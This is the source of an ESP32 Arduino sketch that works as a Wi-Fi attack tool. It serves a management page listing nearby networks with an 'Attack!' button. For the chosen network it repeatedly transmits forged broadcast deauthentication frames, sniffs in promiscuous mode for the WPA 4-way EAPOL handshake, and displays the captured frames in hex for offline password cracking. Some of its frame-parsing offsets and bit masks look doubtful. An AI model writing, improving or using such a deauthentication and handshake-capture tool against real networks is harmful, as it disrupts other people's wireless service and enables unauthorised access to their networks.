#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include "esp_wifi.h"

// AP credentials
const char* ap_ssid = "ManagementAP";
const char* ap_pass = "mgmtadmin";

// Web server
AsyncWebServer server(80);

String targetSSID;
uint8_t targetBSSID[6];
int targetChannel = 1;

#define MAX_HANDSHAKE_LEN 512
uint8_t handshakeBuf[MAX_HANDSHAKE_LEN];
size_t handshakeLen = 0;
bool handshakeCaptured = false;

// Buffer to hold handshake frames (4-way handshake consists of 4 messages)
// We will try to collect all 4 valid EAPOL frames matching handshake

struct HandshakeFrame {
  uint8_t data[256];
  size_t length;
  bool received;
};

HandshakeFrame handshakeFrames[4];

void clearHandshakeFrames() {
  for (int i = 0; i < 4; i++) {
    handshakeFrames[i].received = false;
    handshakeFrames[i].length = 0;
  }
}

bool isEapolFrame(const uint8_t* payload, int len) {
  if (len < 14) return false;
  // Check if Ethernet type is EAPOL (0x888E)
  return (payload[12] == 0x88 && payload[13] == 0x8E);
}

// Compare MAC addresses (6 bytes)
bool macEqual(const uint8_t* a, const uint8_t* b) {
  for (int i = 0; i < 6; i++) {
    if (a[i] != b[i]) return false;
  }
  return true;
}

// Function to check and store EAPOL frames corresponding to handshake messages
// Message number is identified by checking key info field in WPA key descriptor
// Ref: https://www.wireshark.org/tools/wpa-handshake.html

void tryStoreHandshakeFrame(const uint8_t* payload, int len) {
  if(len < 95) return; // Minimum length for full EAPOL-Key frame

  // EAPOL-Key starts at payload+14 (skip ethernet header)
  const uint8_t* eapol = payload + 14;

  // Key Info field is 2 bytes at offset 5
  uint16_t keyInfo = (eapol[5] << 8) | eapol[6];

  // Mask bits to get message number
  // Message 1: bit 3 (ACK) set, bit 7 (MIC) cleared => 0x08 set, 0x40 clear
  // Message 2: MIC set, ACK cleared
  // We'll use known patterns:

  bool mic = (keyInfo & 0x0100) != 0;       // bit 8 (MIC)
  bool ack = (keyInfo & 0x008) != 0;        // bit 3 (ACK)
  bool install = (keyInfo & 0x40) != 0;     // bit 6 (INSTALL)

  int msgNum = 0;
  if(ack && !mic) msgNum = 1;
  else if(mic && !ack && !install) msgNum = 2;
  else if(mic && ack && install) msgNum = 3;
  else if(mic && ack && !install) msgNum = 4;

  if(msgNum == 0) return; // not a handshake message

  if(!handshakeFrames[msgNum - 1].received) {
    size_t copyLen = len > sizeof(handshakeFrames[msgNum - 1].data) ? sizeof(handshakeFrames[msgNum - 1].data) : len;
    memcpy(handshakeFrames[msgNum - 1].data, payload, copyLen);
    handshakeFrames[msgNum - 1].length = copyLen;
    handshakeFrames[msgNum - 1].received = true;
  }
}

// Check if all 4 handshake messages received
bool fullHandshakeCaptured() {
  for (int i = 0; i < 4; i++) {
    if (!handshakeFrames[i].received) return false;
  }
  return true;
}

// Copy handshake frames to handshakeBuf for displaying
void prepareHandshakeOutput() {
  handshakeLen = 0;
  for (int i = 0; i < 4; i++) {
    memcpy(handshakeBuf + handshakeLen, handshakeFrames[i].data, handshakeFrames[i].length);
    handshakeLen += handshakeFrames[i].length;
  }
}

void sendDeauth() {
  uint8_t packet[] = {
    0xC0, 0x00,             // type/subtype: deauth
    0x00, 0x00,             // duration
    0xff,0xff,0xff,0xff,0xff,0xff, // DA broadcast
    0,0,0,0,0,0,           // SA target BSSID
    0,0,0,0,0,0,           // BSSID target BSSID
    0x00,0x00,             // seq
    0x07,0x00              // reason code
  };
  memcpy(packet+4, targetBSSID, 6);
  memcpy(packet+10, targetBSSID, 6);
  memcpy(packet+16, targetBSSID, 6);

  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  for(int i=0; i<20; i++){
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
  }
}

void promiscCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if(handshakeCaptured || type != WIFI_PKT_DATA) return;
  const wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *payload = p->payload;
  int len = p->rx_ctrl.sig_len;

  if(isEapolFrame(payload, len)) {
    tryStoreHandshakeFrame(payload, len);

    if(fullHandshakeCaptured()) {
      handshakeCaptured = true;
      prepareHandshakeOutput();
      esp_wifi_set_promiscuous(false);
    }
  }
}

void startAttack() {
  handshakeCaptured = false;
  handshakeLen = 0;
  clearHandshakeFrames();

  // Turn off WiFi AP mode
  WiFi.mode(WIFI_MODE_NULL);

  // Start promiscuous mode and register callback
  esp_wifi_set_promiscuous(true);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&promiscCb);

  // Send deauth frames continuously until handshake is captured
  while(!handshakeCaptured){
    sendDeauth();
    delay(200);
  }

  // Stop promiscuous mode
  esp_wifi_set_promiscuous(false);

  // Restart AP mode to bring back management page
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(ap_ssid, ap_pass);
  delay(500); // let AP come up
}

// Generate network scan page
String genScanPage() {
  int n = WiFi.scanComplete();
  if(n == WIFI_SCAN_FAILED){
    WiFi.scanNetworks(true);
    return "<p>Scanning networks... refresh in a few seconds.</p>";
  }
  if(n == 0){
    return "<p>No networks found. Try refreshing.</p>";
  }
  String s = "<!DOCTYPE html><html><head><title>Select Network</title></head><body>";
  s += "<h2>Available Networks</h2>";
  s += "<form method='POST' action='/attack'><select name='ssid'>";
  for(int i=0; i<n; i++){
    s += "<option value='" + WiFi.SSID(i) + "'>";
    s += WiFi.SSID(i) + " (" + String(WiFi.RSSI(i)) + " dBm)</option>";
  }
  s += "</select><button type='submit'>Attack!</button></form></body></html>";
  return s;
}

void setup() {
  Serial.begin(115200);

  // Start AP
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(ap_ssid, ap_pass);
  Serial.println("AP started");

  delay(1000);
  WiFi.scanNetworks(true); // Start async scan

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *req){
    if(handshakeCaptured){
      String out = "<html><body><h2>Captured!</h2><pre style='user-select: all;'>";
      for(size_t i=0; i<handshakeLen; i++){
        char buf[4];
        sprintf(buf, "%02X", handshakeBuf[i]);
        out += buf;
        if((i & 1) == 1) out += ' ';
      }
      out += "</pre></body></html>";
      req->send(200, "text/html", out);
    } else {
      req->send(200, "text/html", genScanPage());
    }
  });

  server.on("/attack", HTTP_POST, [](AsyncWebServerRequest *req){
    if(req->hasParam("ssid", true)){
      targetSSID = req->getParam("ssid", true)->value();

      int found = WiFi.scanNetworks(false, true);
      for(int i=0; i<found; i++){
        if(WiFi.SSID(i) == targetSSID){
          memcpy(targetBSSID, WiFi.BSSID(i), 6);
          targetChannel = WiFi.channel(i);
          break;
        }
      }

      req->send(200, "text/html",
        "<html><body><h2>Trying…</h2>"
        "<script>setTimeout(()=>location='/', 1000);</script>"
        "</body></html>"
      );

      // Run attack in background task
      xTaskCreate([](void*){
        startAttack();
        vTaskDelete(NULL);
      }, "attackTask", 8192, NULL, 1, NULL);
    } else {
      req->send(400, "text/plain", "SSID not selected");
    }
  });

  server.begin();
}

void loop() {
  // no loop work needed
}
